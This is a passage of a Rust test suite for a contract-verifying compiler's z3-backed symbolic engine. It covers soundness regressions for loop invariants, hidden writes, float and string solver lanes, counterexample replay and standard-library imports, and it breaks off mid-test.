        // (`z`) that a loop-carried variable reads (`x = x + z`) but that is written in a branch /
        // nested loop / via a non-modelable RHS was frozen at its stale pre-loop value, "proving" a
        // false invariant. `x` reaches 300 at runtime, so `invariant(x == 0)` is false.
        assert!(
            !discharged("fn f() { let z = 0; let x = 0; let i = 0; while i < 3 invariant(x == 0) { x = x + z; if i >= 0 { z = z + 100; } i = i + 1; } assert(x == 0); }"),
            "an auxiliary variable written in a branch must not be frozen in the transition (false proof)"
        );
        assert!(
            !discharged("fn f() { let z = 0; let x = 0; let i = 0; while i < 3 invariant(x == 0) { x = x + z; z = (z + 2) / 1; i = i + 1; } assert(x == 0); }"),
            "an auxiliary variable with a non-modelable update must drop its stale fact (false proof)"
        );
        assert!(
            !discharged("fn f() { let z = 0; let x = 0; let i = 0; while i < 3 invariant(x == 0) { x = x + z; let mut k = 0; while k < 1 { z = z + 50; k = k + 1; } i = i + 1; } assert(x == 0); }"),
            "an auxiliary variable written in a nested loop must drop its stale fact (false proof)"
        );
        // Control: a string auxiliary the integer invariant does not read must NOT be over-rejected.
        assert!(
            discharged("fn f(n: u32) -> u32 requires(n < 100) ensures(result >= 0) { let mut s = \"\"; let mut i = 0; while i < n invariant(i >= 0) { s = s + \"x\"; i = i + 1; } return i; }"),
            "an irrelevant (string) auxiliary must not block an integer invariant"
        );
        // STALE-REASSIGNMENT false proof (adversarial-sweep round 4): a variable reassigned BEFORE (or
        // between) the loop kept a stale solver fact (`x == 1`) that the invariant machinery re-armed,
        // laundering a false invariant. The Assign handler must drop the stale fact, not just
        // modelability. `x` is 2 at runtime, so `invariant(x == 1)` is false.
        assert!(
            !discharged("fn main() { let mut x = 1; x = 2; let mut i = 0; while i < 1 invariant(x == 1) { i = i + 1; } assert(x == 1); }"),
            "a variable reassigned before the loop must not keep a stale fact for the invariant base case"
        );
        assert!(
            !discharged("fn main() { let mut n = 100; n = 3; let mut i = 0; while i < n invariant(i >= 0) { i = i + 1; } assert(i >= 100); }"),
            "a stale reassigned CONDITION variable must not launder a false post-loop bound"
        );
        assert!(
            !discharged("fn main() { let mut x = 0; let mut i = 0; while i < 3 invariant(x >= 0) { x = x + 1; i = i + 1; } x = 0 - 50; let mut j = 0; while j < 1 invariant(x >= 0) { j = j + 1; } assert(x >= 0); }"),
            "a reassignment between two loops must invalidate the first loop's post-fact"
        );
        // A loop-body `let` that SHADOWS a modeled variable is conservatively REJECTED (round-6
        // soundness fix): a shadow would let the transition read the outer symbolic's stale fact while
        // the runtime uses the shadow's value, certifying a false invariant. Rejecting is fail-closed.
        assert!(
            !discharged("fn main() { let y = 0; let mut z = 0; let mut i = 0; while i < 3 invariant(z == 0) { let y = 5; z = y; i = i + 1; } assert(z == 0); }"),
            "a loop-body `let` shadowing a modeled variable must be rejected (false proof)"
        );
        assert!(
            !discharged("fn main() { let y = 0; let mut z = 0; let mut i = 0; while i < 3 invariant(z == 0) { let (y, w) = (8, 1); z = y; i = i + 1; } }"),
            "a destructuring `let` shadowing a modeled variable must be rejected"
        );
        // Control: a FRESH (non-shadowing) loop-local `let` is still fine.
        assert!(
            discharged("fn f(n: u32) -> u32 requires(n < 100) ensures(result >= 0) { let mut i = 0; while i < n invariant(i >= 0) { let q = 100; i = i + 1; } return i; }"),
            "a fresh non-shadowing loop-local `let` does not block verification"
        );
        // EMBEDDED-ASSIGNMENT false proof (adversarial-sweep round 5): an assignment hidden inside an
        // `if`/`match`/block EXPRESSION (`let z = if true { x = x + 1; 0 } else { 0 };`) mutates `x`
        // at runtime but is invisible to a statement-only scan. The flat-body rule rejects any loop
        // body statement whose expressions embed such a block. `x` reaches 5 at runtime.
        assert!(
            !discharged("fn main() { let mut i = 0; let mut x = 0; while i < 5 invariant(x == 0) { let z = if true { x = x + 1; 0 } else { 0 }; i = i + 1; } assert(x == 0); }"),
            "an assignment hidden in an if-expression must not be missed (false proof)"
        );
        // Counter-reset idiom (false disproof, round 5): `i = 0;` before a counted loop must keep its
        // invariant provable — the reassignment must RE-ESTABLISH the new constant fact, not just drop
        // the old one. `i` is 0 on entry, so `invariant(i >= 0)` holds.
        assert!(
            discharged("fn main() { let mut i = 5; i = 0; while i < 4 invariant(i >= 0) { i = i + 1; } print(i); }"),
            "a constant reassignment (`i = 0;`) before a loop must re-establish the fact for the base case"
        );
        // HIDDEN-WRITE false proof (adversarial-sweep round 8): a write hidden inside an `if`/`match`
        // block EXPRESSION used as a `let` initializer (`let d = if true { x = x + 1; 0 } else { 0 };`)
        // was invisible to the loop's write scan, so `x`'s stale pre-loop fact survived and a post-loop
        // `ensures(result == 0)` was falsely certified (runtime returns 3). The write scan is now
        // expression-aware, so the hidden mutation is seen and the false certification is rejected.
        assert!(
            !discharged("fn f() -> u32 ensures(result == 0) { let mut x = 0; let mut i = 0; while i < 3 { let d = if true { x = x + 1; 0 } else { 0 }; i = i + 1; } return x; }"),
            "a write hidden in an expression must be seen by the loop write scan (false proof)"
        );
        assert!(
            !discharged("fn f() -> u32 ensures(result == 0) { let mut x = 0; let mut i = 0; while i < 3 { let d = match i { 0 => { x = x + 1; 0 } _ => 0 }; i = i + 1; } return x; }"),
            "a write hidden in a match-arm expression must be seen (false proof)"
        );
        // CONDITIONAL-PATH LEAK false proofs (adversarial-sweep round 9): a fact asserted on a path
        // that may NOT run — a zero-trip loop body or an untaken `if` branch — must NOT leak as an
        // unconditional fact. `f(0)` runs the loop/branch zero times and returns 0, so the certified
        // `ensures(result == 5)` is false and must be REJECTED.
        assert!(
            !discharged("fn f(n: i64) -> i64 requires(n >= 0) requires(n < 100) ensures(result == 5) { let mut x = 0; let mut i = 0; while i < n { x = 5; i = i + 1; } return x; }"),
            "a zero-trip loop body's fact must not leak as an unconditional post-loop fact"
        );
        assert!(
            !discharged("fn f(c: i64) -> i64 ensures(result == 5) { let mut x = 0; if c == 1 { x = 5; } return x; }"),
            "an untaken `if` branch's fact must not leak past the `if`"
        );
        assert!(
            !discharged("fn f() -> i64 ensures(result == 200) { let mut x = 0; let mut i = 0; while i < 3 { x = 100; i = i + 1; } let mut j = 0; while j < 0 { x = 200; j = j + 1; } return x; }"),
            "a zero-trip SECOND loop must not override the value with an unreached assignment"
        );
        // Control: a `for` loop over a non-empty range that provably runs still lets a post-loop
        // invariant-backed property through (via a while-with-invariant restatement is the norm; a
        // bare post-loop ensures over a loop-carried var without an invariant is correctly rejected).
        // The counter-reset idiom at TOP LEVEL (not conditional) still re-establishes its fact:
        assert!(
            discharged("fn main() { let mut i = 5; i = 0; while i < 4 invariant(i >= 0) { i = i + 1; } print(i); }"),
            "a top-level (non-conditional) reassignment still re-establishes its fact"
        );

        // Valid inductive invariants accept (controls, no over-rejection):
        assert!(
            discharged("fn f() -> u32 ensures(result >= 0) { let mut x = 10; while x > 0 invariant(x >= 0) { x = x - 1; } return x; }"),
            "a bounded-decrement invariant proves"
        );
        assert!(
            discharged("fn f(n: u32) -> u32 requires(n >= 0) requires(n < 100) ensures(result >= 0) { let mut s = 0; let mut i = 0; while i < n invariant(s >= 0) invariant(s <= i) invariant(i >= 0) invariant(i <= n) { s = s + 1; i = i + 1; } return s; }"),
            "a multi-clause interdependent invariant proves (frame keeps n's bound in scope)"
        );
    }

    #[test]
    fn solver_does_not_disprove_loop_carried_assertions() {
        // A binding mutated after its `let` (here, accumulated in a loop) cannot be modeled from
        // its initial value; the checker must not disprove a TRUE post-loop assertion against the
        // stale pre-loop value. `total` ends at 10, so `assert(total == 10)` must not FAIL.
        let src = "fn main() { let mut total = 0; for i in 1..5 { total = total + i; } \
                   assert(total == 10); }";
        let ast = parse_source(src).expect("parse");
        let ir = typecheck(ast, frontend::Mode::Safe).expect("typecheck");
        let checks = SymbolicEngine::check_obligations(&ir);
        assert!(
            checks.iter().all(|c| c.status != "FAIL"),
            "must not disprove a true loop-carried assertion: {:?}",
            checks
        );
    }

    #[test]
    fn real_counterexample_replay_confirms_a_genuine_z3_model() {
        // `x < 10` and `x > 20` cannot both hold, so z3 must produce a genuine witness for
        // `assumptions ∧ ¬assertion`. Real replay: independently re-verify z3's OWN model
        // against the SAME query it decided, rather than trusting the model text.
        let src = r#"
fn bad() {
    research {
        let x: tainted<u32> = symbolic();
        assume(x < 10);
        assert(x > 20);
    }
}
"#;
        let ast = parse_source(src).expect("parse");
        let ir = typecheck(ast, frontend::Mode::Research).expect("typecheck");
        let checks = SymbolicEngine::check_obligations(&ir);
        let failed = checks
            .iter()
            .find(|c| c.name.contains("assert") && c.status == "FAIL")
            .expect("assert(x > 20) must fail given assume(x < 10)");
        let model = failed.model.as_deref().expect("a FAIL must carry a model");
        assert!(
            middle::replay_counterexample(&failed.smt, model),
            "z3's own witness must replay as a genuine counterexample"
        );
    }

    #[test]
    fn real_counterexample_replay_rejects_a_forged_model() {
        // Regression guard for the retired substring-matching replay stub, which special-cased
        // exactly one magic value (`#x0000000f`/`15`). This forges a DIFFERENT value (100) that
        // violates the SAME assumption (`x < 10`) against the real query z3 decided. A sound
        // replay must reject it because it re-derives the answer from the query itself — it
        // does not depend on which value is forged.
        let src = r#"
fn bad() {
    research {
        let x: tainted<u32> = symbolic();
        assume(x < 10);
        assert(x > 20);
    }
}
"#;
        let ast = parse_source(src).expect("parse");
        let ir = typecheck(ast, frontend::Mode::Research).expect("typecheck");
        let checks = SymbolicEngine::check_obligations(&ir);
        let failed = checks
            .iter()
            .find(|c| c.name.contains("assert") && c.status == "FAIL")
            .expect("assert(x > 20) must fail given assume(x < 10)");
        let real_model = failed.model.as_deref().expect("a FAIL must carry a model");
        let var_name = real_model
            .split("define-fun ")
            .nth(1)
            .and_then(|rest| rest.split_whitespace().next())
            .expect("model must name the symbolic variable");
        // 100 (0x64) violates `x < 10` — a genuinely inconsistent witness, not the old stub's
        // hardcoded special case.
        let forged_model = format!("(define-fun {var_name} () (_ BitVec 64) #x0000000000000064)");
        assert!(
            !middle::replay_counterexample(&failed.smt, &forged_model),
            "a forged witness that violates the assumption must fail to replay"
        );
    }

    #[test]
    fn real_counterexample_replay_rejects_an_unparseable_model() {
        // No parseable witness means no confirmed counterexample — fail closed rather than
        // treat unparseable/empty model text as a pass.
        assert!(!middle::replay_counterexample(
            "(set-logic QF_BV)\n(check-sat)\n",
            "not a model"
        ));
    }

    #[test]
    fn phase4_divisor_maybe_zero_is_named_and_shifts_use_bvashr() {
        // A1 residual: unguarded variable divisor → ANUBIS_DIVISOR_MAYBE_ZERO (not a silent cert).
        let err = tc_ok("fn f(n: u32) -> u32 ensures(result == 1) { return 6 / n; }")
            .expect_err("unguarded / n must reject ensures");
        assert!(err.contains("ANUBIS_DIVISOR_MAYBE_ZERO"), "got: {err}");
        // Zero literal divisor:
        let err =
            tc_ok("fn f(x: u32) -> u32 requires(x == 5) ensures(result == 5) { return x / 0; }")
                .expect_err("/ 0 must reject");
        assert!(
            err.contains("ANUBIS_DIVISOR_MAYBE_ZERO") || err.contains("ANUBIS_CONTRACT"),
            "got: {err}"
        );
        // Proven non-zero still models (no reject):
        tc_ok("fn f(n: u32) -> u32 requires(n != 0) ensures(result == 3) { return 6 / n; }")
            .expect("guarded divisor must accept");
        // bvashr lock via discharge helpers (false arithmetic-shift claim fails):
        let discharged = |src: &str| match typecheck(parse_source(src).expect("parse"), Mode::Safe)
        {
            Ok(ir) => SymbolicEngine::check_obligations(&ir)
                .iter()
                .all(|c| c.status != "FAIL"),
            Err(_) => false,
        };
        assert!(
            discharged("fn f() -> u32 ensures(result == 0 - 4) { return (0 - 8) >> 1; }"),
            "bvashr: -8 >> 1 == -4"
        );
        assert!(
            !discharged("fn f() -> u32 ensures(result == 4) { return (0 - 8) >> 1; }"),
            "bvlshr trap must not pass"
        );
    }

    #[test]
    fn phase4_replay_mismatch_detail_on_forged_path() {
        // B1 residual: a FAIL model that does not replay is labeled ANUBIS_REPLAY_MISMATCH.
        // Force a sat path then forge — unit-level on SolverCheck detail after check_obligations
        // already tags genuine models as "(replayed)".
        let src = r#"
fn bad() {
    research {
        let x: tainted<u32> = symbolic();
        assume(x < 10);
        assert(x > 20);
    }
}
"#;
        let ir = typecheck(parse_source(src).expect("parse"), Mode::Research).expect("tc");
        let checks = SymbolicEngine::check_obligations(&ir);
        let failed = checks
            .iter()
            .find(|c| c.name.contains("assert") && c.status == "FAIL")
            .expect("must FAIL");
        assert!(
            failed.detail.contains("replayed") || failed.detail.contains("ANUBIS_REPLAY_MISMATCH"),
            "FAIL detail should mention replay: {}",
            failed.detail
        );
        // Direct API: forged model fails replay
        let model = failed.model.as_deref().unwrap();
        let var = model
            .split("define-fun ")
            .nth(1)
            .and_then(|r| r.split_whitespace().next())
            .unwrap();
        let forged = format!("(define-fun {var} () (_ BitVec 64) #x0000000000000064)");
        assert!(!middle::replay_counterexample(&failed.smt, &forged));
    }

    #[test]
    fn phase4_proptest_discharge_and_disproof() {
        // B3: program-level differential net.
        use backends::run::compile_and_run_source;
        use middle::proptest;

        let discharged = |src: &str| -> bool {
            match typecheck(parse_source(src).expect("parse"), Mode::Safe) {
                Ok(ir) => SymbolicEngine::check_obligations(&ir)
                    .iter()
                    .all(|c| c.status != "FAIL" && c.status != "UNKNOWN"),
                Err(_) => false,
            }
        };

        // P_discharge: true contracts discharge; runtime prints oracle.
        for seed in 1u64..40 {
            let (src, oracle) = proptest::gen_true_contract_program(seed, 2);
            assert!(
                discharged(&src),
                "seed {seed} true contract must discharge:\n{src}"
            );
            let out = compile_and_run_source(&src, false, &[]).expect("run");
            assert!(
                out.status.success(),
                "seed {seed} run failed: {}",
                String::from_utf8_lossy(&out.stderr)
            );
            let printed = String::from_utf8_lossy(&out.stdout).trim().to_string();
            // Runtime prints i64; may wrap display — compare as i64 parse when possible.
            if let Ok(got) = printed.parse::<i64>() {
                assert_eq!(got, oracle, "seed {seed} runtime != oracle\n{src}");
            }
        }

        // Symbolic true program discharges + runs.
        let sym_ok = proptest::gen_symbolic_true_program();
        assert!(discharged(&sym_ok), "symbolic true must discharge");
        let out = compile_and_run_source(&sym_ok, false, &[]).expect("run");
        assert!(out.status.success());
        assert_eq!(String::from_utf8_lossy(&out.stdout).trim(), "8");

        // P_disproof: false contracts fail obligations; runtime value != wrong ensures constant.
        for seed in 1u64..25 {
            let (src, body_val) = proptest::gen_false_contract_program(seed, 2);
            let ir = match typecheck(parse_source(&src).expect("parse"), Mode::Safe) {
                Ok(ir) => ir,
                Err(e) => panic!("seed {seed} parse/tc: {e}\n{src}"),
            };
            let checks = SymbolicEngine::check_obligations(&ir);
            let any_fail = checks.iter().any(|c| c.status == "FAIL");
            assert!(
                any_fail,
                "seed {seed} false contract must FAIL:\n{src}\n{:?}",
                checks
            );
            // Runtime still computes body value.
            let out = compile_and_run_source(&src, false, &[]).expect("run");
            assert!(out.status.success(), "seed {seed}");
            let got: i64 = String::from_utf8_lossy(&out.stdout)
                .trim()
                .parse()
                .unwrap_or(body_val);
            assert_eq!(got, body_val, "seed {seed}");
            // Model replay when present:
            if let Some(f) = checks
                .iter()
                .find(|c| c.status == "FAIL" && c.model.is_some())
            {
                assert!(
                    middle::replay_counterexample(&f.smt, f.model.as_deref().unwrap()),
                    "seed {seed} FAIL model must replay"
                );
            }
        }

        let sym_bad = proptest::gen_symbolic_false_program();
        assert!(!discharged(&sym_bad), "symbolic false must not discharge");
    }

    #[test]
    fn phase4_bounded_seq_qf_abv_and_fail_closed_codes() {
        // A2: fixed list literal + constant in-range index + len — discharge.
        let discharged = |src: &str| match typecheck(parse_source(src).expect("parse"), Mode::Safe)
        {
            Ok(ir) => SymbolicEngine::check_obligations(&ir)
                .iter()
                .all(|c| c.status != "FAIL" && c.status != "UNKNOWN"),
            Err(_) => false,
        };
        assert!(
            discharged(
                "fn f() -> u32 ensures(result == 20) { let xs = [10, 20, 30]; return xs[1]; }"
            ),
            "xs[1] of fixed list must prove"
        );
        assert!(
            discharged(
                "fn f() -> u32 ensures(result == 3) { let xs = [1, 2, 3]; return len(xs); }"
            ),
            "len of fixed list must prove"
        );
        assert!(
            discharged("fn f() -> u32 ensures(result == 20) { return [10, 20, 30][1]; }"),
            "inline literal index must prove"
        );
        // False postcondition on seq read must FAIL (not silent pass).
        assert!(
            !discharged(
                "fn f() -> u32 ensures(result == 99) { let xs = [10, 20, 30]; return xs[1]; }"
            ),
            "wrong ensures on xs[1] must fail"
        );
        // OOB-possible index → ANUBIS_INDEX_MAYBE_OOB
        let err =
            tc_ok("fn f(i: u32) -> u32 ensures(result == 0) { let xs = [1, 2, 3]; return xs[i]; }")
                .expect_err("symbolic index must reject");
        assert!(err.contains("ANUBIS_INDEX_MAYBE_OOB"), "got: {err}");
        // Constant OOB index also rejected (not proven in-range).
        let err = tc_ok("fn f() -> u32 ensures(result == 0) { let xs = [1, 2]; return xs[5]; }")
            .expect_err("OOB constant must reject");
        assert!(err.contains("ANUBIS_INDEX_MAYBE_OOB"), "got: {err}");
        // Unbounded list param → ANUBIS_SEQ_UNBOUNDED
        let err = tc_ok("fn f(xs: list) -> u32 ensures(result == xs[0]) { return xs[0]; }")
            .expect_err("unbounded seq must reject");
        assert!(
            err.contains("ANUBIS_SEQ_UNBOUNDED") || err.contains("ANUBIS_INDEX"),
            "got: {err}"
        );
        let err = tc_ok("fn f(xs: list) -> u32 ensures(result == len(xs)) { return len(xs); }")
            .expect_err("len of param must reject");
        assert!(err.contains("ANUBIS_SEQ_UNBOUNDED"), "got: {err}");
    }

    #[test]
    fn phase4_string_and_float_opaque_diagnostics() {
        // S (Phase-3 QF_S): a MODELABLE string-equality contract — a comparison with a string LITERAL —
        // now DISCHARGES instead of staying opaque. `result == "ok"` for `return "ok"` is `"ok" == "ok"`,
        // proved in QF_S. (Strings are no longer blanket-rejected.)
        assert!(
            tc_ok(r#"fn f() -> string ensures(result == "ok") { return "ok"; }"#).is_ok(),
            "a true modelable string ensures should discharge under the QF_S lane",
        );
        // …and a VAR-vs-VAR string equality now DISCHARGES too (the literal-anchor requirement was
        // dropped: runtime `String==String` and SMT `(= a b)` are exact structural equality, and the
        // obligation carries a `strings` sort tag so QF_S routes even without a `"` in the body). `result`
        // substitutes to the returned `s`, so this is `s == s`. See phase3_qf_s_var_var_string_equality.
        assert!(
            tc_ok(r#"fn f(s: string) -> string ensures(result == s) { return s; }"#).is_ok(),
            "a var-var string identity ensures must now discharge (QF_S var-var lane)"
        );
        // F (Phase-3 QF_FP): a MODELABLE float contract — a comparison over `+ - *` of finite floats —
        // now DISCHARGES instead of staying opaque. `result == 1.5` for `return 1.5` is a true contract
        // the QF_FP Float64 lane proves. (Floats are no longer blanket-rejected.)
        assert!(
            tc_ok("fn f() -> f64 ensures(result == 1.5) { return 1.5; }").is_ok(),
            "a true modelable float ensures should discharge under the QF_FP lane",
        );
        // …but a NON-modelable float construct stays fail-closed — the lane never fabricates a proof for
        // what it cannot faithfully model. `%` is excluded (Rust f64 `%` is fmod, not SMT fp.rem); `/`
        // IS modelable now (fp.div is total + bit-exact), so it is no longer the opaque example.
        let err = tc_ok("fn f(x: f64, y: f64) -> f64 ensures(result == x % y) { return x % y; }")
            .expect_err("a non-modelable float `%` ensures must still reject");
        assert!(err.contains("ANUBIS_"), "got: {err}");
    }

    #[test]
    fn phase3_qf_fp_float_contract_lane() {
        // Runs the SOLVER (not just typecheck): discharged iff typecheck OK AND no obligation FAILs —
        // the same helper the integer solver tests use, so a disproved float ensures counts as not
        // discharged.
        let discharged =
            |src: &str| match typecheck(parse_source(src).expect("parse"), frontend::Mode::Safe) {
                Ok(ir) => SymbolicEngine::check_obligations(&ir)
                    .iter()
                    .all(|c| c.status != "FAIL"),
                Err(_) => false,
            };
        // A TRUE float postcondition over `+ - *` discharges via the QF_FP Float64/RNE lane: for
        // 0 < x < 1, x*x < x (z3 proves it UNSAT).
        assert!(
            discharged(
                "fn sq_lt(x: f64) -> f64 requires(x > 0.0) requires(x < 1.0) ensures(result < x) \
                 { return x * x; }"
            ),
            "a true float monotonicity contract should discharge",
        );
        // A FALSE float postcondition is DISPROVED (z3 counterexample), never silently accepted.
        assert!(
            !discharged(
                "fn sq_gt(x: f64) -> f64 requires(x > 0.0) requires(x < 1.0) ensures(result > x) \
                 { return x * x; }"
            ),
            "a false float ensures must be disproved",
        );
        // SOUNDNESS GUARD (the NaN fix): the runtime `<=` is partial_cmp().unwrap_or(Equal), so
        // `NaN <= 10.0` is TRUE at runtime — f(NaN) is admitted by the requires yet `NaN < 999.0` is
        // FALSE. The `<=` NaN-disjunction keeps NaN in the assumed set, so this violable contract is
        // NOT certified. A bare `fp.leq` encoding would falsely prove it.
        assert!(
            !discharged(
                "fn f(x: f64) -> f64 requires(x <= 10.0) ensures(result < 999.0) { return x; }"
            ),
            "a contract violable at a NaN input must not be falsely certified",
        );
        // Float `/` is modelable (fp.div RNE is total + bit-exact). A BOUNDED division contract
        // discharges: for 2 < x < 4, x/2 ∈ (1,2) < 2.
        assert!(
            discharged(
                "fn f(x: f64) -> f64 requires(x > 2.0) requires(x < 4.0) ensures(result < 2.0) \
                 { return x / 2.0; }"
            ),
            "a bounded true float division contract should discharge",
        );
        // …but an UNBOUNDED division 'monotonicity' correctly does NOT discharge — x may be +inf
        // (admitted by `x > 0.0`), and inf/2 = inf is NOT < inf. fp.div matching the runtime catches it.
        assert!(
            !discharged(
                "fn f(x: f64) -> f64 requires(x > 0.0) ensures(result < x) { return x / 2.0; }"
            ),
            "an unbounded float division contract must not falsely discharge (the inf edge)",
        );
        // Float `assert` (body position): a bounded assert discharges under its requires…
        assert!(
            discharged(
                "fn f(x: f64) requires(x > 2.0) requires(x < 4.0) { assert(x < 4.0); }\n\
                 fn main() { f(3.0); }"
            ),
            "a bounded float assert should discharge",
        );
        // …and a float assert that need not hold under its contract is disproved (not silently
        // deferred). The function MUST declare a contract — a plain, contract-free function keeps its
        // param-opaque semantics (identical to the integer lane), so `assert(x > 4.0)` there would
        // correctly defer to runtime. Under `requires(x > 2.0)`, `x > 4.0` does not follow (x = 3).
        assert!(
            !discharged(
                "fn f(x: f64) requires(x > 2.0) { assert(x > 4.0); }\nfn main() { f(3.0); }"
            ),
            "a false float assert must be disproved",
        );

        // Float `let` CHAINING: a float-modelable `let` becomes a Float64 defining-fact so a later float
        // `ensures`/`assert` proves through it. `let y = x * 2.0` with 1 < x < 2 gives y in (2, 4).
        assert!(
            discharged(
                "fn scale(x: f64) -> f64 requires(x > 1.0) requires(x < 2.0) \
                 ensures(result > 2.0) ensures(result < 4.0) { let y = x * 2.0; return y; }\n\
                 fn main() { let r = scale(1.5); }"
            ),
            "a float let should chain into a later ensures",
        );
        // A chained `let` used by a later float `assert` in the body. Multiplication by 2.0 is EXACT in
        // IEEE-754 (an exponent bump, no rounding), so 1 < x < 2 gives 2 < y < 4 with no round-to-even
        // edge — unlike `x + 1.0` where x = 3.0 + 2^-51 rounds to exactly 4.0, which the float lane
        // (correctly) refuses to prove `> 4.0` for. The bit-exact model is the point.
        assert!(
            discharged(
                "fn g(x: f64) requires(x > 1.0) requires(x < 2.0) { let y = x * 2.0; assert(y > 2.0); }\n\
                 fn main() { g(1.5); }"
            ),
            "a float let should chain into a later assert",
        );
        // Float LET of a float LET (chaining depth 2): `a = x*2` then `y = a*a`. `y >= 0` for every f64
        // (incl. NaN via the `>=` NaN-disjunction). Guards the Lens-2 defect: the integer defining-fact
        // push must be gated off for a genuinely-float let, else `(= anb_y (bvmul anb_a anb_a))` is
        // injected and poisons the QF_FP obligation (bvmul on Float64) → spurious reject.
        assert!(
            discharged(
                "fn sq(x: f64) -> f64 ensures(result >= 0.0) { let a = x * 2.0; let y = a * a; return y; }\n\
                 fn main() { let r = sq(3.0); }"
            ),
            "a float let of a float let must chain (no spurious bit-vector fact)",
        );
        // SOUNDNESS (Lens-1 false-accept guard): a float `let` whose variable is REASSIGNED inside a
        // `match`-arm is NOT chained — the statement-level frame sweep never visits an embedded write, so
        // admitting it would leak the stale `y = 2.0` fact and certify `result == 2.0` while the arm sets
        // `y = 100.0` at runtime. The `reassigned_roots` gate refuses to model any reassigned float let,
        // so `result` is unmodeled and the check rejects fail-closed (ANUBIS_FLOAT_CONTRACT_UNMODELED, a
        // typecheck-surfaced diagnostic — NOT a solver FAIL, so `tc_ok(...).expect_err` is the right probe,
        // not `discharged`, which only sees obligations).
        let err = tc_ok(
            "fn leak(c: i64) -> f64 ensures(result == 2.0) \
             { let y = 2.0; match c { 0 => { y = 100.0; } _ => {} } return y; }\n\
             fn main() { let r = leak(0); }",
        )
        .expect_err("a float let reassigned in a match arm must not certify a violable contract");
        assert!(
            err.contains("ANUBIS_FLOAT_CONTRACT_UNMODELED"),
            "match-arm reassign leak guard — got: {err}"
        );
        // SOUNDNESS: a variable reassigned anywhere (even straight-line) is not chained (fail-closed):
        // `y` ends at 100.0, so `result < 50.0` must NOT be certified against the stale `y = 0.0`.
        let err = tc_ok(
            "fn h() -> f64 ensures(result < 50.0) { let y = 0.0; y = 100.0; return y; }\n\
             fn main() { let r = h(); }",
        )
        .expect_err("a reassigned float let must not be chained");
        assert!(
            err.contains("ANUBIS_FLOAT_CONTRACT_UNMODELED"),
            "reassigned float let guard — got: {err}"
        );
    }

    #[test]
    fn phase3_float_proptest_solver_matches_oracle() {
        use middle::proptest;
        // Differential net for the QF_FP float encoder: `ensures(result == <oracle>)` over a random f64
        // arithmetic body discharges IFF z3's QF_FP evaluation equals the Rust f64 oracle — so a wrong op
        // mapping (`+` as `fp.mul`, a rounding-mode slip, …) fails to discharge and the harness catches
        // it. No runtime run needed: the discharge IS the solver↔oracle check, immune to print formatting.
        let discharged = |src: &str| -> bool {
            match typecheck(parse_source(src).expect("parse"), frontend::Mode::Safe) {
                Ok(ir) => SymbolicEngine::check_obligations(&ir)
                    .iter()
                    .all(|c| c.status != "FAIL" && c.status != "UNKNOWN"),
                Err(_) => false,
            }
        };
        let mut true_checked = 0;
        let mut false_checked = 0;
        for seed in 1u64..80 {
            // P_discharge: a TRUE float-arithmetic contract discharges (z3 fp == Rust f64 oracle).
            if let Some((src, _)) = proptest::gen_true_float_contract_program(seed, 3) {
                true_checked += 1;
                assert!(
                    discharged(&src),
                    "seed {seed} true float contract must discharge:\n{src}"
                );
            }
            // P_disproof: a FALSE float contract (`result == oracle + 1`) is disproved, never certified.
            if let Some((src, _)) = proptest::gen_false_float_contract_program(seed, 3) {
                false_checked += 1;
                let ir = typecheck(parse_source(&src).expect("parse"), frontend::Mode::Safe)
                    .expect("false-contract program must typecheck");
                assert!(
                    SymbolicEngine::check_obligations(&ir)
                        .iter()
                        .any(|c| c.status == "FAIL"),
                    "seed {seed} false float contract must FAIL:\n{src}"
                );
            }
        }
        assert!(
            true_checked >= 10,
            "expected >=10 finite true float contracts, got {true_checked}"
        );
        assert!(
            false_checked >= 10,
            "expected >=10 false float contracts, got {false_checked}"
        );
    }

    #[test]
    fn phase3_string_proptest_solver_matches_oracle() {
        use middle::proptest;
        // Differential net for the QF_S string encoder: string `==` is EXACT structural equality both at
        // runtime and in QF_S, so the property is the encoder's INJECTIVITY. A TRUE contract (`result ==
        // "s"` for `return "s"`) must discharge (reflexivity); a FALSE contract over a runtime-DISTINCT
        // pair must FAIL. The pool is loaded with the encoder's risk surface — a backslash, a `"`, and a
        // `\u{..}`-shaped literal — so a non-injective encoding (e.g. an unescaped `\u{..}` z3 re-decodes)
        // would let a false contract discharge and this harness catches it. No runtime run needed.
        let discharged = |src: &str| -> bool {
            match typecheck(parse_source(src).expect("parse"), frontend::Mode::Safe) {
                Ok(ir) => SymbolicEngine::check_obligations(&ir)
                    .iter()
                    .all(|c| c.status != "FAIL" && c.status != "UNKNOWN"),
                Err(_) => false,
            }
        };
        let mut true_checked = 0;
        let mut false_checked = 0;
        for seed in 1u64..80 {
            // P_discharge: a TRUE string contract (same literal both sides) discharges.
            let (tsrc, _) = proptest::gen_true_string_contract_program(seed);
            true_checked += 1;
            assert!(
                discharged(&tsrc),
                "seed {seed} true string contract must discharge:\n{tsrc}"
            );
            // P_disproof (INJECTIVITY): a FALSE string contract over a distinct pair must FAIL — never
            // certified. This is the automated guard against the `\u`-decode false-accept class.
            let (fsrc, a, b) = proptest::gen_false_string_contract_program(seed);
            assert_ne!(a, b, "false generator must pick distinct runtime strings");
            false_checked += 1;
            let ir = typecheck(parse_source(&fsrc).expect("parse"), frontend::Mode::Safe)
                .expect("false-contract program must typecheck");
            assert!(
                SymbolicEngine::check_obligations(&ir)
                    .iter()
                    .any(|c| c.status == "FAIL"),
                "seed {seed} false string contract (return {a:?} ensures {b:?}) must FAIL:\n{fsrc}"
            );
        }
        assert!(
            true_checked >= 20,
            "expected >=20 true string contracts, got {true_checked}"
        );
        assert!(
            false_checked >= 20,
            "expected >=20 false string contracts, got {false_checked}"
        );
    }

    #[test]
    fn phase5_stdlib_import_resolve_combine_and_run() {
        // Virtual std.*: no project std on disk; combine + run pure modules.
        use backends::run::compile_and_run_items;
        let dir = unique_test_dir("phase5-stdlib-run");
        std::fs::create_dir_all(&dir).unwrap();
        let entry = dir.join("main.anb");
        std::fs::write(
            &entry,
            r#"
import std.math;
import std.collections;
import std.str;
import std.testing;
fn main() {
    testing::assert_eq(math::math_add(20, 22), 42);
    let s = collections::set_insert(collections::set_new(), 7);
    testing::assert_true(collections::set_contains(s, 7));
    testing::assert_eq(str::str_upper("ok"), "OK");
    print(42);
}
"#,
        )
        .unwrap();
        let items = resolve::combine_from_entry(&entry).expect("combine std");
        let names: Vec<_> = items
            .iter()
            .filter_map(|it| match it {
                frontend::Item::Fn { name, .. } => Some(name.as_str()),
                _ => None,
            })
            .collect();
        assert!(
            names.iter().any(|n| n.starts_with("std_math__")),
            "expected namespaced std.math fns, got {names:?}"
        );
        let out = compile_and_run_items(&items, false, &[]).expect("run");
        assert!(
            out.status.success(),
